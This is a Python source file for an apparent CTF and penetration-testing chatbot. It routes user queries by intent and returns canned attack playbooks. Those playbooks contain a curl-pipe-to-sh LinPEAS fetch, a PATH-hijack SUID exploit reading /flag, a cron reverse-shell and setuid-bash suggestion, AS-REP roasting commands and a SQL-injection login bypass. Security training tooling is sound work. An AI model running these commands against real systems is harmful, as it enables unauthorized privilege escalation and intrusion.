"""
core/routers/intent_router.py

Deterministic intent classification and fallback reasoning router.
Extracted from ChatAssistant to cleanly decouple query routing from chat orchestration.
"""

from typing import Dict, Any, List, Optional
from enum import Enum
import re


class Intent(str, Enum):
    RESET = "reset"
    RECON = "recon"
    STEERING = "steering"
    EXPLAIN_OUTPUT = "explain_output"
    CTF_PRIVESC = "ctf_privesc"
    AD_NETWORK = "ad_network"
    WEB_API = "web_api"
    GENERAL = "general"


class IntentRouter:
    """
    Decoupled intent classifier and rule-based fallback response engine.
    Holds no state; acts as a pure functional component.
    """

    # ==================================================================
    # OPERATOR STEERING, RESET & RECON DETECTION
    # ==================================================================
    @staticmethod
    def detect_operator_steering(query: str) -> bool:
        """
        Check if the user is guiding, correcting, or steering the AI away from a tangent.
        """
        q = query.lower()
        steering_indicators = [
            "hallucinat", "tangent", "off on a tangent", "stop enum", "stop scanning",
            "don't enum", "dont enum", "already know", "already found", "focus on",
            "skip recon", "skip enum", "that is wrong", "that's wrong", "you missed",
            "why are you scanning", "why keep enum", "recognise the actual next step",
            "recognize the actual next step", "give me the exploit", "how do i exploit",
            "didn't stop enumerating", "didnt stop enumerating"
        ]
        return any(ind in q for ind in steering_indicators)

    @staticmethod
    def detect_reset_or_different_challenge(query: str) -> bool:
        """
        Check if the operator is signaling that this is a different challenge,
        a new box/target, or requesting to reset assumptions from previous sessions.
        """
        q = query.lower()
        reset_indicators = [
            "different challenge", "not this challenge", "different lab", "new challenge",
            "different box", "different machine", "start fresh", "reset", "different target",
            "not the same challenge", "clean slate", "not this one", "another challenge"
        ]
        return any(ind in q for ind in reset_indicators)

    @staticmethod
    def detect_recon_request(query: str) -> bool:
        """
        Check if the operator is asking for initial recon commands, methodology,
        or how to find what vulnerability exists on a Linux/Ubuntu system.
        """
        q = query.lower()
        recon_phrases = [
            "where do i start", "where to start", "where should i start", "how to start",
            "how do i start", "where do we start", "where to begin", "what to do first",
            "info gathering", "information gathering", "recon", "reconnaissance",
            "how to find the type of vuln", "find the type of vuln", "find vulnerability",
            "find vuln", "what vuln", "identify vulnerability", "type of vulnerability",
            "commands for a ubuntu", "commands for ubuntu", "commands for linux",
            "ubuntu terminal", "linux terminal", "recon commands", "recon scripts",
            "enumeration commands", "enumeration scripts", "initial enumeration"
        ]
        return any(phrase in q for phrase in recon_phrases)

    # ==================================================================
    # INTENT CLASSIFICATION
    # ==================================================================
    def classify(
        self,
        query: str,
        state: Optional[Dict[str, Any]] = None,
        intel: Optional[Dict[str, Any]] = None
    ) -> Intent:
        """
        Classify the query into one of 8 distinct offensive security intents.
        """
        clean_msg = query.strip()
        msg_lower = clean_msg.lower()
        state = state or {}

        # 1. Reset / Different Challenge
        if self.detect_reset_or_different_challenge(clean_msg):
            return Intent.RESET

        # 2. Linux / Initial Recon Methodology & Commands
        if self.detect_recon_request(clean_msg):
            return Intent.RECON

        # 3. Operator Steering / Tangent Correction
        if self.detect_operator_steering(clean_msg):
            return Intent.STEERING

        # 4. Output Explanation / Binary Identification
        if any(w in msg_lower for w in (
            "binary", "binaries", "explain output", "what did we find",
            "what does this mean", "explain the result", "explain the output", "what is this"
        )):
            return Intent.EXPLAIN_OUTPUT

        # 5. CTF / Privilege Escalation Specific Questions
        if (
            state.get("type") == "ctf"
            or any(w in msg_lower for w in ("flag", "ctf", "pwn", "suid", "privesc", "privilege", "transient", "fortune"))
            or bool(re.search(r'\b(path\s+hijack|path\s+injection|\$path)\b', msg_lower))
        ):
            return Intent.CTF_PRIVESC

        # 6. Active Directory / Network Queries
        if any(p in msg_lower for p in ("smb", "kerberos", "active directory", "445", "ldap", "domain")):
            return Intent.AD_NETWORK

        # 7. Web / API / Bounty
        if any(w in msg_lower for w in ("sqli", "sql", "xss", "web", "http", "api", "jwt", "ssrf")):
            return Intent.WEB_API

        # 8. General Conversational / Security Advice
        return Intent.GENERAL

    # ==================================================================
    # SAFE RESET EXECUTION
    # ==================================================================
    @staticmethod
    def execute_reset(state: Dict[str, Any]) -> str:
        """Actually wipe session state. Only called after explicit 'reset confirm'."""
        state["artifacts"] = state.get("artifacts", [])
        state["artifacts"] = []
        state["notes"] = []
        state["completed_steps"] = []
        state.pop("focus", None)
        state.pop("operator_directive", None)
        return (
            "[RESET CONFIRMED] **All session state cleared.**\n\n"
            "Starting fresh. No SUID assumptions, no PATH hijacking bias, no prior notes.\n"
            "Paste your first terminal output or describe the target to begin."
        )

    # ==================================================================
    # DISPATCH FALLBACK
    # ==================================================================
    def dispatch_fallback(
        self,
        intent: Intent,
        query: str,
        state: Dict[str, Any],
        intel: Dict[str, Any],
        rag_context: str,
        yaml_tactics: List[str]
    ) -> str:
        """
        Execute deterministic rule-based fallback response for the given intent.
        """
        msg_lower = query.strip().lower()

        if intent == Intent.RESET:
            if "reset confirm" in msg_lower:
                return self.execute_reset(state)
            return self.reason_reset_challenge(query, state)

        elif intent == Intent.RECON:
            return self.reason_linux_recon_methodology(query, state)

        elif intent == Intent.STEERING:
            return self.reason_steering_response(query, state, intel)

        elif intent == Intent.EXPLAIN_OUTPUT:
            return self.explain_pasted_output_and_binaries(query, state, intel)

        elif intent == Intent.CTF_PRIVESC:
            return self.reason_ctf_query(query, state, intel, rag_context, yaml_tactics)

        elif intent == Intent.AD_NETWORK:
            return self.reason_ad_query(query, state, rag_context, yaml_tactics)

        elif intent == Intent.WEB_API:
            return self.reason_web_query(query, state, rag_context, yaml_tactics)

        else:
            return self.reason_general_query(query, state, rag_context, yaml_tactics)

    # ==================================================================
    # REASONING MODULE: RESET / DIFFERENT CHALLENGE
    # ==================================================================
    def reason_reset_challenge(self, query: str, state: Dict[str, Any]) -> str:
        """
        Ask the operator to confirm before wiping session state.
        Never auto-wipes — a benign query containing 'reset' should not destroy data.
        """
        return (
            "[RESET?] **It looks like you want to switch to a different challenge or target.**\n\n"
            "To protect your current session (notes, findings, completed steps), I will not "
            "clear anything automatically.\n\n"
            "**To confirm and wipe all session state**, type:\n"
            "```\nreset confirm\n```\n\n"
            "Or continue working on this session and I'll treat that as a clarifying question."
        )

    # ==================================================================
    # REASONING MODULE: LINUX RECON METHODOLOGY & VULNERABILITY TRIAGE
    # ==================================================================
    def reason_linux_recon_methodology(self, query: str, state: Dict[str, Any]) -> str:
        """
        Provide a structured, non-hallucinatory Linux/Ubuntu reconnaissance playbook
        designed to systematically uncover the exact vulnerability class.
        """
        lines = [
            "[METHODOLOGY] **Linux / Ubuntu Reconnaissance & Vulnerability Discovery Playbook**\n",
            "When landing on an unknown Linux target, never guess the exploit vector. Follow this systematic 5-phase reconnaissance methodology to identify what vulnerability class is present.\n",
            "### **Phase 1: Environment, Identity & Sudo Privileges**",
            "Run these commands first to understand who you are and what privileges you hold:",
            "```bash",
            "# 1. Check your user ID, primary group, and supplementary groups (look for sudo, docker, lxd, adm)",
            "id && whoami",
            "",
            "# 2. Check kernel version and Linux distribution (potential kernel exploit if ancient)",
            "uname -a && cat /etc/os-release",
            "",
            "# 3. Check sudo permissions (the #1 quickest privilege escalation vector)",
            "sudo -l",
            "```",
            "💡 *What to look for*: If `sudo -l` shows any allowed binary (especially with `NOPASSWD`), check [GTFOBins](https://gtfobins.github.io/) immediately to execute root commands.\n",
            "### **Phase 2: SUID / SGID Binaries & Capabilities (The Classic CTF Vector)**",
            "Search the entire filesystem for binaries that execute with root privileges:",
            "```bash",
            "# Find all SUID executables (owned by root with the setuid bit)",
            "find / -perm -4000 -type f 2>/dev/null",
            "",
            "# Check for POSIX file capabilities (e.g., cap_setuid+ep)",
            "getcap -r / 2>/dev/null",
            "```",
            "💡 *What to look for*: Separate standard system binaries (`/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/ping`) from unusual or custom binaries located in directories like `/challenge/`, `/opt/`, `/usr/local/bin/`, or `/home/`.\n",
            "### **Phase 3: Challenge Directories & File Permissions**",
            "Inspect the filesystem for target-specific challenge files and readable flags:",
            "```bash",
            "# Check challenge directories and home directories",
            "ls -la /challenge /opt /home/* 2>/dev/null",
            "",
            "# Check if the flag exists and inspect its read permissions",
            "ls -la /flag /root/flag.txt 2>/dev/null",
            "",
            "# Find all world-writable directories you can write scripts into",
            "find / -writable -type d 2>/dev/null | grep -v -E '/proc|/sys'",
            "```",
            "💡 *What to look for*: If `/flag` is readable by all users, `cat /flag` solves the challenge immediately. If `/flag` is `-r-------- root:root`, you must escalate privileges or exploit a root-owned process.\n",
            "### **Phase 4: Running Processes, Scheduled Tasks & Network Ports**",
            "Check for automated scripts, background daemons, or hidden local listeners:",
            "```bash",
            "# Inspect running processes (look for scripts or binaries running as root)",
            "ps aux | grep -v '\\[.*\\]'",
            "",
            "# Inspect cron jobs and scheduled tasks",
            "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
            "",
            "# Check internal network ports listening locally (127.0.0.1)",
            "ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null",
            "```\n",
            "### **Phase 5: Automated LinPEAS & Process Snoopers**",
            "If manual triage is clean, run automated enumeration scripts:",
            "```bash",
            "# Download and run LinPEAS (if curl/wget has internet or local transfer)",
            "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "",
            "# Monitor background executions in real time without root permissions",
            "./pspy64 -pf -i 1000",
            "```\n",
            "---",
            "### **How to Determine the Vulnerability Class From Your Output:**",
            "1. **Custom SUID Binary Found:** Run `strings <binary> | head -n 40` and `ltrace <binary>`.",
            "   - If it calls an external command without a full path (e.g. `cat` instead of `/bin/cat`), it is **$PATH Hijacking**.",
            "   - If it uses `system()` with user input, it is **Command Injection**.",
            "   - If it uses `printf(argv[1])`, it is a **Format String** flaw.",
            "   - If it uses `strcpy`/`gets`, it is a **Buffer Overflow**.",
            "2. **`sudo -l` Shows Binaries:** Check the binary on [GTFOBins](https://gtfobins.github.io/).",
            "3. **Writable Cron Script:** Overwrite or append a reverse shell or `chmod +s /bin/bash` into the script.",
            "4. **Local Port Open:** Use `curl http://127.0.0.1:<port>` or SSH local port forwarding to inspect the service.\n",
            "**Next Step:** Run **Phase 1 and Phase 2** in your terminal right now, copy the raw terminal output, and paste it here. I will analyze the output and pinpoint the exact vulnerability vector for you!"
        ]
        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: OPERATOR STEERING & TANGENT CORRECTION
    # ==================================================================
    def reason_steering_response(
        self,
        query: str,
        state: Dict[str, Any],
        intel: Dict[str, Any]
    ) -> str:
        """
        Handle operator guidance when the AI is off on a tangent or enumeration loop.
        """
        lines = []
        lines.append("[!] **Understood, Operator -- Course Correcting Immediately.**")
        lines.append("You are completely right. We have already gathered sufficient reconnaissance; continuing generic enumeration was a tangent.")
        lines.append("")

        custom_bin = intel["custom_binaries"][0] if intel.get("custom_binaries") else None
        strings = intel.get("strings_findings", [])

        if custom_bin and strings:
            lines.append("**Current Concrete Ground Truth:**")
            lines.append(f"* **Identified Target SUID Binary:** `{custom_bin}` (runs with effective UID root).")
            lines.append(f"* **Discovered Execution Behavior:** Binary invokes `{', '.join(strings)}`.")
            lines.append("* **Vulnerability:** Unqualified relative path execution -- the binary calls helper commands without an absolute path.")
            lines.append("")
            lines.append("[EXPLOIT] **Tactical Exploit Plan (Ready to Execute):**")
            lines.append("Instead of further enumeration, we execute the **$PATH Variable Hijack** right now:")
            lines.append("")
            lines.append("```bash")
            first_cmd = "fortune" if any("fortune" in s for s in strings) else "sh"
            lines.append(f"# 1. Create a fake payload matching the command invoked by {custom_bin}")
            lines.append(f"echo '#!/bin/sh' > /tmp/{first_cmd}")
            lines.append(f"echo 'cat /flag' >> /tmp/{first_cmd}")
            lines.append(f"chmod +x /tmp/{first_cmd}")
            lines.append("")
            lines.append(f"# 2. Prepend /tmp to PATH and trigger the SUID binary")
            lines.append(f"PATH=/tmp:$PATH {custom_bin}")
            lines.append("```")
            lines.append("")
            lines.append("Run this in your target shell. Once you see the flag, copy it here and type `paste`!")
            state["operator_directive"] = "exploit"
            state["focus"] = f"PATH hijack on {custom_bin}"
        elif custom_bin:
            lines.append(f"We have identified the target executable: **`{custom_bin}`**.")
            lines.append("To determine the exact exploit without further generic scans, run:")
            lines.append(f"```bash\nstrings {custom_bin} | head -n 30\nltrace {custom_bin}\n```")
            lines.append("Paste that output here, and we will craft the exploit payload immediately.")
        else:
            lines.append("Halting all background enumeration. To focus the exploit strategy, paste the output of:")
            lines.append("```bash\nfind / -perm -4000 -type f 2>/dev/null\nls -la /challenge\n```")
            lines.append("Once pasted, we will target the candidate binary directly.")

        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: EXPLAIN OUTPUT & IDENTIFY BINARY
    # ==================================================================
    def explain_pasted_output_and_binaries(
        self,
        query: str,
        state: Dict[str, Any],
        intel: Dict[str, Any]
    ) -> str:
        """
        Provide technical analysis of pasted terminal outputs and clearly explain
        which binary is the focus and what each section of output means.
        """
        lines = []
        custom_bins = intel.get("custom_binaries", [])
        suid_bins = intel.get("suid_binaries", [])
        strings_found = intel.get("strings_findings", [])
        user = intel.get("user") or "ubuntu"
        groups = intel.get("groups", [])
        raw_notes = " ".join(intel.get("raw_notes_text", []))

        lines.append("[ANALYSIS] **Detailed Technical Analysis of Your Pasted Output:**")
        lines.append("=" * 60)
        lines.append("")

        # Section 1: Binary Identification
        lines.append("### 1. What is the Binary Here?")
        if custom_bins:
            target_bin = custom_bins[0]
            lines.append(f"The primary target binary is **`{target_bin}`**.")
            lines.append("* In Linux environments, standard SUID binaries like `/usr/bin/passwd` or `/usr/bin/su` are standard OS utilities.")
            lines.append(f"* **`{target_bin}`** is the custom challenge executable designed for this target.")
            lines.append(f"* Because its SUID bit is set (mode `4000`), when you execute `{target_bin}` as user `{user}`, it runs with **effective UID 0 (root)**.")
        elif suid_bins:
            lines.append("From your enumeration output, candidate SUID executables include:")
            for b in suid_bins[:5]:
                lines.append(f"* `{b}`")
            lines.append("Inspect these binaries with `strings <binary> | head -n 30` to see if they call helper commands or drop privileges.")
        else:
            lines.append("In the output pasted above (`id`, `uname -a`, `pwd && ls -la`), **no custom binary was executed or displayed yet**.")
            lines.append("* A **binary** in Linux is a compiled executable program (like `/bin/bash` or a custom challenge executable).")
            lines.append("* In CTF and privilege escalation challenges, the target binary is usually a custom executable owned by `root` with the **SUID bit set**, typically located in `/challenge/` or `/opt/`.")
            lines.append("* To discover candidate binaries on this machine, run:")
            lines.append("  ```bash")
            lines.append("  find / -perm -4000 -type f 2>/dev/null")
            lines.append("  ls -la /challenge /opt 2>/dev/null")
            lines.append("  ```")
        lines.append("")

        # Section 2: Breakdown of the Pasted Output
        lines.append("### 2. Technical Breakdown of the Pasted Output")
        has_id_output = "uid=" in raw_notes or "groups=" in raw_notes
        has_uname_output = "Linux" in raw_notes or "generic" in raw_notes
        has_ls_output = "total" in raw_notes or ".bash_history" in raw_notes or "drwx" in raw_notes

        if has_id_output:
            lines.append("• **User Context (`id && whoami`):**")
            lines.append(f"  - You are operating as user **`{user}`** (UID `1000`, standard unprivileged user).")
            if "sudo" in groups:
                lines.append("  - ⚠️ You belong to group **`sudo`**! Run `sudo -l` immediately to see if you can run commands as root without a password.")
            if "adm" in groups:
                lines.append("  - You belong to group **`adm`**, which grants read access to `/var/log` system logs.")
            lines.append("")

        if has_uname_output:
            lines.append("• **Kernel & Architecture (`uname -a`):**")
            kernel = intel.get("kernel") or "Linux 6.8.0-134-generic x86_64"
            lines.append(f"  - **System Info**: `{kernel}`.")
            lines.append("  - Modern 64-bit Linux kernel. This confirms the machine is modern Ubuntu, so user-space privilege escalation (SUID, sudo, cron) is far more likely than an outdated kernel exploit.")
            lines.append("")

        if has_ls_output:
            lines.append("• **Filesystem Context (`pwd && ls -la`):**")
            lines.append("  - **Directory**: You are currently in `/home/hacker` (or your user home directory).")
            lines.append("  - **`.bash_history` (495 bytes)**: Notice that `.bash_history` has content! You can run `cat ~/.bash_history` to see commands run by previous users or the challenge creator.")
            lines.append("")

        if strings_found:
            lines.append("• **Binary Strings Analysis (`strings`):**")
            for sf in strings_found:
                lines.append(f"  - Discovered: `{sf}`")
            lines.append("  - This indicates relative command invocation or a privileged wrapper!")
            lines.append("")

        # Section 3: Next Actions
        lines.append("### 3. Immediate Recommended Actions")
        if custom_bins and strings_found:
            lines.append(f"Execute the $PATH hijack exploit on `{custom_bins[0]}`:")
            lines.append("```bash\necho '#!/bin/sh' > /tmp/fortune && echo 'cat /flag' >> /tmp/fortune && chmod +x /tmp/fortune\nPATH=/tmp:$PATH " + custom_bins[0] + "\n```")
        elif "sudo" in groups:
            lines.append("1. Run `sudo -l` to check sudo rights.")
            lines.append("2. Run `find / -perm -4000 -type f 2>/dev/null` to locate SUID binaries.")
            lines.append("3. Run `ls -la /challenge 2>/dev/null` to check for challenge executables.")
        else:
            lines.append("Run the Phase 2 SUID search: `find / -perm -4000 -type f 2>/dev/null` and paste the result.")

        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: CTF & PRIVILEGE ESCALATION
    # ==================================================================
    def reason_ctf_query(
        self,
        query: str,
        state: Dict[str, Any],
        intel: Dict[str, Any],
        rag_context: str,
        yaml_tactics: List[str]
    ) -> str:
        q = query.lower()
        lines = []

        custom_bin = intel.get("custom_binaries", [None])[0] if intel.get("custom_binaries") else None

        # Check for explicit PATH hijacking or relative invocation inquiries
        if any(w in q for w in ("path hijack", "path injection", "$path", "transient path")):
            lines.append("[TARGET] **Tactical Analysis: PATH Injection & SUID Exploitation**")
            target_desc = f"`{custom_bin}`" if custom_bin else "the target SUID binary"
            lines.append(f"In this scenario, {target_desc} executes external utilities using relative paths rather than absolute paths.")
            lines.append("To exploit this vector:")
            lines.append("1. **Identify the invoked command:**")
            lines.append(f"   Run `strings {custom_bin or '<binary>'} | head -n 30` or `ltrace {custom_bin or '<binary>'}` to see what commands it calls.")
            lines.append("2. **Create a malicious interceptor in `/tmp`:**")
            lines.append("   ```bash")
            lines.append("   echo '#!/bin/sh' > /tmp/<command_name>")
            lines.append("   echo 'cat /flag' >> /tmp/<command_name>")
            lines.append("   chmod +x /tmp/<command_name>")
            lines.append("   ```")
            lines.append("3. **Prepend `/tmp` to PATH and execute the binary:**")
            lines.append(f"   ```bash\n   PATH=/tmp:$PATH {custom_bin or '<binary>'}\n   ```")
            lines.append("")

        elif "flag" in q or "permission" in q:
            lines.append("[AUDIT] **Flag Permission Architecture:**")
            lines.append("`/flag` is typically protected with mode `0400` (-r-------- root:root).")
            if custom_bin:
                lines.append(f"To read it, you must escalate or execute through an SUID wrapper such as `{custom_bin}`.")
            else:
                lines.append("To read it, you must escalate privileges or exploit a root-owned SUID executable.")
            lines.append("")

        elif custom_bin:
            lines.append("[TACTICS] **CTF Tactical Guidance:**")
            lines.append(f"Identified binary: `{custom_bin}`")
            lines.append("Recommended triage actions:")
            lines.append(f"1. Check permissions and ownership: `ls -la {custom_bin}`")
            lines.append(f"2. Inspect strings for commands or calls: `strings {custom_bin} | head -n 40`")
            lines.append(f"3. Trace system calls: `ltrace {custom_bin}` or `strace {custom_bin}`")

        else:
            lines.append("[TACTICS] **CTF Reconnaissance Guidance:**")
            lines.append("No custom target binary has been identified yet in this session.")
            lines.append("To locate candidate SUID binaries or challenge files, run:")
            lines.append("```bash")
            lines.append("find / -perm -4000 -type f 2>/dev/null")
            lines.append("ls -la /challenge 2>/dev/null")
            lines.append("```")
            lines.append("Paste the output here once executed, and I will pinpoint the target binary.")

        if yaml_tactics:
            lines.append("\n[SCENARIOS] **Matching Tactical Scenarios:**")
            for t in yaml_tactics:
                lines.append(f"  {t}")

        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: ACTIVE DIRECTORY
    # ==================================================================
    def reason_ad_query(self, query: str, state: Dict[str, Any], rag_context: str, yaml_tactics: List[str]) -> str:
        lines = [
            "[SECURITY] **Active Directory Strategy & Next Actions:**",
            "When auditing Active Directory domain services:",
            "1. **Anonymous / Guest SMB Enumeration:**",
            "   `netexec smb TARGET_IP -u '' -p '' --shares`",
            "   `netexec smb TARGET_IP --pass-pol`",
            "2. **Kerberos AS-REP Roasting (Accounts with 'Do not require Kerberos preauthentication'):**",
            "   `GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt`",
            "3. **LDAP User & Group Extraction:**",
            "   `netexec ldap TARGET_IP -u '' -p '' --users`"
        ]
        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: WEB & API
    # ==================================================================
    def reason_web_query(self, query: str, state: Dict[str, Any], rag_context: str, yaml_tactics: List[str]) -> str:
        lines = [
            "[WEB AUDIT] **Web Application Vulnerability Assessment:**",
            "For web parameter and endpoint validation:",
            "1. **Input Reflection & Header Inspection:**",
            "   `curl -i -s -k \"URL\" -H \"User-Agent: SecurityAudit\"`",
            "2. **Parameter Fuzzing & Injection Validation:**",
            "   `ffuf -w wordlist.txt -u \"URL?FUZZ=test\" -mc 200,301,302`",
            "3. **SQLi / Authentication Bypass Probe:**",
            "   `curl -s -k \"URL/login\" -d \"user=' OR 1=1--&pass=\" -i`"
        ]
        return "\n".join(lines)

    # ==================================================================
    # REASONING MODULE: GENERAL CONVERSATIONAL ADVICE
    # ==================================================================
    def reason_general_query(self, query: str, state: Dict[str, Any], rag_context: str, yaml_tactics: List[str]) -> str:
        lines = [
            "[CO-PILOT] **Cyber AI Hacker Co-Pilot:**",
            f"Regarding your question: \"{query}\"",
            "",
            "I can assist you across the full offensive lifecycle:",
            "* **Analyze pasted output**: Paste any terminal scan, strings dump, or SUID list using `paste` and ask me to break it down.",
            "* **Steer assessment strategy**: Tell me if I am on a tangent or if you want to skip straight to exploitation.",
            "* **Step-by-step guidance**: Type `next` to get tactical step recommendations or `run` to execute.",
            "* **Assessment tracking**: Use `new <name>` or `open <name>` to record findings and generate final compliance reports (`report`)."
        ]
        if rag_context:
            lines.append("\n[KNOWLEDGE] **Relevant Security Knowledge:**")
            lines.append(rag_context[:300].strip() + "...")
        return "\n".join(lines)
